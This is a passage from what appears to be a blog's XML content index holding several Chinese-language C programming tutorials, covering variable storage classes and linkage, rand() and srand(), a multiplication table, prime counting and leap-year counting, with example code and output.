id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h6><p>代码块内部申明的变量，并且<strong>缺省</strong>情况下都是(<code>auto</code>)类型，所以很少使用，存储于堆栈中，程序执行到申明变量处被创建，离开后被销毁，每次在堆栈中占据的内存位置都<strong>可能不同</strong>。</p><h6 id="寄存器变量"><a href="#寄存器变量" class="headerlink" title="寄存器变量"></a>寄存器变量</h6><p>用于申明<strong>自动变量</strong>，即在<strong>代码块内部</strong>使用，使这类变量存储于寄存器中，<strong>寄存器中的变量比内存中的变量访问效率更高</strong>。<br>但是，如果有<strong>太多</strong>变量申明为 <code>register</code> ，只会选取前几个存储于寄存器中，其它处理为普通自动变量。</p><p>通常把<strong>使用频率最高</strong>的变量申明为寄存器变量，或者指针申明为寄存器变量，以提高效率。例如可以把函数的形参申明为寄存器变量（有可能它节省的时间空间开销抵不上复制这几个值的开销）。</p><h6 id="综合举例"><a href="#综合举例" class="headerlink" title="综合举例"></a>综合举例</h6><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                  <span class="token comment">/* 静态变量(static)，这里不能使用 register */</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>              <span class="token comment">/* 自动变量，省略 auto */</span><span class="token keyword">register</span> <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>     <span class="token comment">/* 寄存器变量(register) */</span><span class="token keyword">int</span> <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token keyword">register</span> <span class="token keyword">int</span> d<span class="token punctuation">)</span> <span class="token comment">/* 申明函数形参为 register */</span><span class="token keyword">static</span> <span class="token keyword">int</span> e <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>       <span class="token comment">/* 申明静态变量，和变量 b 一个属性 */</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h6><p>静态变量在不指定初始值的时候，初始化为 <code>0</code>；<br>自动变量是否初始化赋值，并无效率的改变（每次执行都要重新初始化），这也是它的优点：可以用任何“表达式”作为初始值。例如：</p><pre><code>int add(int a)&#123;    int b = a + 1;      /* 将表达式 a + 1 的值初始化给 b */    return b;&#125;</code></pre><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ul><li><code>static</code> 申明函数或代码块之外的变量时，只修改<strong>链接属性</strong> ``external<code>为</code>internal`，<strong>存储类型</strong>和<strong>作用域</strong>不变。</li><li><code>static</code> 申明代码块内部变量时，将自动变量修改为<strong>静态变量</strong>，但是<strong>链接属性</strong>和<strong>作用域</strong>不变。</li></ul><h6 id="综合举例-1"><a href="#综合举例-1" class="headerlink" title="综合举例"></a>综合举例</h6><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>             <span class="token comment">/* 链接属性为 external，缺省 extern */</span><span class="token keyword">static</span> <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token comment">/* 修改连接属性为静态变量，不能被其它源文件访问，依然为全局变量，存储于静态内存中 */</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>         <span class="token comment">/* 自动变量，存储到堆栈 */</span><span class="token keyword">static</span> <span class="token keyword">int</span> d <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token comment">/* 静态变量，存储到普通内存，依然不能被其它源文件访问 */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 存储类型 链接属性 静态变量static extern 寄存器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言之随机数函数（rand()）的使用方法</title>
      <link href="/2024/09/27/c-yu-yan/c-yu-yan-zhi-sui-ji-shu-han-shu-de-shi-yong-fang-fa/"/>
      <url>/2024/09/27/c-yu-yan/c-yu-yan-zhi-sui-ji-shu-han-shu-de-shi-yong-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>在程序设计中，难免会使用到随机值函数，其原理与语法大多类似，接下来以C语言为例介绍其随机值函数 <code>rand()</code> 用法。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>引用<a href="https://baike.baidu.com/item/rand%28%29">百度百科</a>，首先，需要包含头文件：</p><pre><code>#include &lt;stdlib.h&gt;</code></pre><p>rand()函数是按指定的顺序来产生整数，因此每次执行上面的语句都打印相同的两个值，所以说C语言的随机并不是真正意义上的随机，有时候也叫<a href="https://baike.baidu.com/item/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0">伪随机数</a>，使用 <code>rand()</code> 生成随机数之前需要用随机发生器的初始化函数 <code>srand(unsigned seed)</code>（也位于 <code>stdlib.h</code> 中） 进行伪随机数序列初始化，<code>seed</code> 又叫<a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E7%A7%8D%E5%AD%90">随机种子</a>，通俗讲就是，如果每次提供的 <code>seed</code> 是一样的话，最后每一轮生成的几个随机值也都是一样的，因此叫伪随机数，所以需要每次提供不同的 <code>seed</code> 达到完全的随机，我们通常用时间函数 <code>time(NULL)</code> 作为 <code>seed</code> ，因为时间值每秒都不同，这个函数需要包含以下头文件：</p><pre><code>#include &lt;time.h&gt;</code></pre><p>理论太泛，下面用例子分析理解。</p><h1 id="举例分析"><a href="#举例分析" class="headerlink" title="举例分析"></a>举例分析</h1><p>先来理解以下伪随机数，编译以下代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d, "</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre><code>8, 9, 9, 1, 7, 5, 5, 10, 1, 0,</code></pre><p>然后无论运行多少次，结果都依然是以上随机数，不会改变，因为每次设置的种子 <code>seed</code> 都是 <code>1</code> 。</p><p>但是假如把 <code>seed</code> 换成 <code>time(NULL)</code>，每次就不一样了，如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d, "</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果是就变了，并且每次都不一样：</p><pre><code>6, 3, 4, 5, 5, 9, 8, 10, 10, 4,6, 4, 2, 4, 3, 2, 5, 1, 2, 9,</code></pre><blockquote><p><strong>这里的 <code>time(NULL)</code> 的结果是一个类似于 <code>1524655706</code> 的数字，并且每秒都在递增 1，也就达成了 srand() 的 seed 不断变化的目的，不断生成新的随机数。</strong></p></blockquote><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><p>这里注意一下例子中函数 <code>rand()</code> 的用法，函数括号内不需要加参数，如果直接调用 <code>rand()</code> 的话会生成下面这样的数：</p><pre><code>17163, 2663, 24810, 4875, 26975, 14119, 22193, 11233, 26009, 20105,</code></pre><p>所以我们想要生成指定范围的随机数的话就需要使用到<strong>求余</strong>运算符 <code>%</code>，这里有个规律：例如我们需要 0–10的随机数时，就写成 <code>rand()%11</code>，0–100就写成 <code>rand()%101</code>，就是运算符后的数字需要比需求范围极值大 1，当然这也是取余运算的原理。</p><hr>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言随机数 伪随机数 rand() srand() </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言打印九九乘法表</title>
      <link href="/2024/09/27/c-yu-yan/c-yu-yan-da-yin-jiu-jiu-cheng-fa-biao/"/>
      <url>/2024/09/27/c-yu-yan/c-yu-yan-da-yin-jiu-jiu-cheng-fa-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="源码如下："><a href="#源码如下：" class="headerlink" title="源码如下："></a>源码如下：</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//打印九九乘法表</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"九九乘法表：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span> <span class="token comment">//初始化打印的两个方向</span><span class="token keyword">for</span> <span class="token punctuation">(</span>y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> y <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> y<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//两层循环嵌套打印输出</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> x <span class="token operator">&lt;=</span> y<span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d*%d=%2d "</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> x <span class="token operator">*</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//%2d表示固定输出两位</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//打印到行尾，换行</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is the end.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="输出结果："><a href="#输出结果：" class="headerlink" title="输出结果："></a>输出结果：</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">九九乘法表：1*1= 12*1= 2 2*2= 43*1= 3 3*2= 6 3*3= 94*1= 4 4*2= 8 4*3=12 4*4=165*1= 5 5*2=10 5*3=15 5*4=20 5*5=256*1= 6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1= 7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1= 8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1= 9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81This is the end.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>代码注释处说明的<code>%2d</code>是为了美观，强行使相乘的结果占两个字符位，否则打印结果如下：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">九九乘法表：1*1=12*1=2 2*2=43*1=3 3*2=6 3*3=94*1=4 4*2=8 4*3=12 4*4=165*1=5 5*2=10 5*3=15 5*4=20 5*5=256*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81This is the end.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有上面美观吧-_-</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言统计素数</title>
      <link href="/2024/09/27/c-yu-yan/c-yu-yan-tong-ji-su-shu/"/>
      <url>/2024/09/27/c-yu-yan/c-yu-yan-tong-ji-su-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="源码如下："><a href="#源码如下：" class="headerlink" title="源码如下："></a>源码如下：</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 1-1000的素数</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1-1000的素数: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> co <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//设置co用于统计个数</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//遍历1-1000</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//素数条件：只能被1和自身整除</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//发现不是素数，则跳出本层循环</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> j<span class="token punctuation">)</span> <span class="token comment">//遍历后，没有除1和自身以外的因数，i==j 表示遍历了 2--自身的所有数并且未发现因数</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>            co<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nTotal: %d\n\n"</span><span class="token punctuation">,</span> co<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">1-1000的素数:2 3 5 7 11 13 17 19 23 29 31 37 41 43 47 53 59 61 67 71 73 79 83 89 97 101 103 107 109 113 127 131 137 139 149 151 157 163 167 173 179 181 191 193 197 199 211 223 227 229 233 239 241 251 257 263 269 271 277 281 283 293 307 311 313 317 331 337 347 349 353 359 367 373 379 383 389 397 401 409 419 421 431 433 439 443 449 457 461 463 467 479 487 491 499 503 509 521 523 541 547 557 563 569 571 577 587 593 599 601 607 613 617 619 631 641 643 647 653 659 661 673 677 683 691 701 709 719 727 733 739 743 751 757 761 769 773 787 797 809 811 821 823 827 829 839 853 857 859 863 877 881 883 887 907 911 919 929 937 941 947 953 967 971 977 983 991 997total: 168<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>素数，又称质数，即整数在一个大于1的自然数中，除了1和此整数自身外，没法被其他自然数整除的数。将1-1000中每个数都对“2–自身”进行整除，<code>i==j</code> 说明是对“2–自身”都遍历了一遍并且未发现符合条件的数，而不是前面发现有多余因数的<code>break;</code></p><blockquote><h4 id="另一个优化的版本，供参考："><a href="#另一个优化的版本，供参考：" class="headerlink" title="另一个优化的版本，供参考："></a>另一个优化的版本，供参考：</h4></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;math.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 1-1000的素数</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1-1000的素数: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> co <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">;</span> j<span class="token operator">+=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">//不遍历偶数，除了2偶数都不是质数</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//实际遍历到此数的平方根就够了，需要引入 &lt;math.h> 头文件</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token function">sqrt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//这里也要变一下</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    co<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\ntotal: %d\n\n"</span><span class="token punctuation">,</span> co<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//注意这里要加上“2”这个数，2是质数也是偶数，之前没有遍历</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就大大缩短了时间。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言统计闰年</title>
      <link href="/2024/09/27/c-yu-yan/c-yu-yan-tong-ji-run-nian/"/>
      <url>/2024/09/27/c-yu-yan/c-yu-yan-tong-ji-run-nian/</url>
      
        <content type="html"><![CDATA[<h2 id="源码如下："><a href="#源码如下：" class="headerlink" title="源码如下："></a>源码如下：</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 统计1-2020的闰年</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1-2020的闰年: \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">int</span> ye<span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ye <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> ye <span class="token operator">&lt;=</span> <span class="token number">2020</span><span class="token punctuation">;</span> ye<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//此处也可更改为指定年份区间</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ye <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ye <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>ye <span class="token operator">%</span> <span class="token number">400</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//闰年的定义：能被4整除但不能被100整除，或能被400整除的年份</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> ye<span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nTotal: %d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用定义的变量c统计</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">1-2020的闰年:4 8 12 16 20 24 28 32 36 40 44 48 52 56 60 64 68 72 76 80 84 88 92 96 104 108 112 116 120 124 128 132 136 140 144 148 152 156 160 164 168 172 176 180 184 188 192 196 204 208 212 216 220 224 228 232 236 240 244 248 252 256 260 264 268 272 276 280 284 288 292 296 304 308 312 316 320 324 328 332 336 340 344 348 352 356 360 364 368 372 376 380 384 388 392 396 400 404 408 412 416 420 424 428 432 436 440 444 448 452 456 460 464 468 472 476 480 484 488 492 496 504 508 512 516 520 524 528 532 536 540 544 548 552 556 560 564 568 572 576 580 584 588 592 596 604 608 612 616 620 624 628 632 636 640 644 648 652 656 660 664 668 672 676 680 684 688 692 696 704 708 712 716 720 724 728 732 736 740 744 748 752 756 760 764 768 772 776 780 784 788 792 796 800 804 808 812 816 820 824 828 832 836 840 844 848 852 856 860 864 868 872 876 880 884 888 892 896 904 908 912 916 920 924 928 932 936 940 944 948 952 956 960 964 968 972 976 980 984 988 992 996 1004 1008 1012 1016 1020 1024 1028 1032 1036 1040 1044 1048 1052 1056 1060 1064 1068 1072 1076 1080 1084 1088 1092 1096 1104 1108 1112 1116 1120 1124 1128 1132 1136 1140 1144 1148 1152 1156 1160 1164 1168 1172 1176 1180 1184 1188 1192 1196 1200 1204 1208 1212 1216 1220 1224 1228 1232 1236 1240 1244 1248 1252 1256 1260 1264 1268 1272 1276 1280 1284 1288 1292 1296 1304 1308 1312 1316 1320 1324 1328 1332 1336 1340 1344 1348 1352 1356 1360 1364 1368 1372 1376 1380 1384 1388 1392 1396 1404 1408 1412 1416 1420 1424 1428 1432 1436 1440 1444 1448 1452 1456 1460 1464 1468 1472 1476 1480 1484 1488 1492 1496 1504 1508 1512 1516 1520 1524 1528 1532 1536 1540 1544 1548 1552 1556 1560 1564 1568 1572 1576 1580 1584 1588 1592 1596 1600 1604 1608 1612 1616 1620 1624 1628 1632 1636 1640 1644 1648 1652 1656 1660 1664 1668 1672 1676 1680 1684 1688 1692 1696 1704 1708 1712 1716 1720 1724 1728 1732 1736 1740 1744 1748 1752 1756 1760 1764 1768 1772 1776 1780 1784 1788 1792 1796 1804 1808 1812 1816 1820 1824 1828 1832 1836 1840 1844 1848 1852 1856 1860 1864 1868 1872 1876 1880 1884 1888 1892 1896 1904 1908 1912 1916 1920 1924 1928 1932 1936 1940 1944 1948 1952 1956 1960 1964 1968 1972 1976 1980 1984 1988 1992 1996 2000 2004 2008 2012 2016 2020Total: 490<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言自增自减运算辨析</title>
      <link href="/2024/09/27/c-yu-yan/c-yu-yan-zi-zeng-zi-jian-yun-suan-bian-xi/"/>
      <url>/2024/09/27/c-yu-yan/c-yu-yan-zi-zeng-zi-jian-yun-suan-bian-xi/</url>
      
